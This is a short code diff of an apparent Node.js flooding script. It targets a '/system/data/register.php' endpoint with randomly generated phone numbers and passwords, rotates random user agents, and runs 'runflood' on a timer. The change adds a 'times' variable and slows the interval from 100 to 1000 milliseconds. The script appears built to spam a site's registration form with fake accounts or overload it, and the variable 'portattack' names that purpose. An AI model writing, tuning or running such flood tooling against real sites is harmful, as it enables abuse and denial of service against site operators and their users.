@@ -25,7 +25,8 @@ var random_useragent = require('random-useragent');
 const urlget = 'localhost'; // URL FOR GET
 const urlfileget = '/system/data/register.php'; // URLFILE FOR GET
 const urlpost = 'https://localhost/system/data/register.php'; // URL FOR POST
-const portattack = '443' // PORT FOR GET & POST
+const portattack = '443'; // PORT FOR GET & POST
+const times = '1000';
  
 const phones = Math.floor(Math.random() * 9000000000) + 1000000000;
 const passwords = Math.floor(Math.random() * 900000000000) + 100000000000;
@@ -68,4 +69,4 @@ req.post({
 
 };
 
- setInterval(runflood, 100);
+ setInterval(runflood, times);
